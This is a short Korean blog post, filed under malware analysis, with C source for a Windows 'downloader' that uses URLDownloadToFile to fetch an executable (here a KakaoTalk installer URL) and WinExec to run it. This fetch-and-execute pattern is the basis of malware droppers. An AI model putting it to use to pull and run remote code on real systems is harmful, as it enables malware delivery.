---
title: C로 Downloader 만들기
categories: 
 - Malware Analysis
 - Malware
tags:
 - Downloader
---

## Downloader

Downloader는 프로그램을 자동으로 다운로드 받게 할 수 있는 프로그램이다.

### 주요 API

- URLDownloadToFile : 인터넷에서 바이너리 형태로  다운로드하여 파일에 저장
- WinExec : 지정한 응용 프로그램을 실행

### 소스 코드

```c
#include <windows.h>

#pragma comment(lib,"urlmon.lib")

int main()
{
    LoadLibrary(L"urlmon.dll");
    HRESULT hResult = URLDownloadToFile(
                            0,
                            L"http://app.pc.kakao.com/talk/win32/KakaoTalk_Setup.exe",
                            L"c:\\Program Files\\a.exe",0,0); // 바이너리 형태로 다운로드
    WinExec("c:\\Program Files\\a.exe",SW_SHOW);  //프로그램 실행
    return 0;
}

```


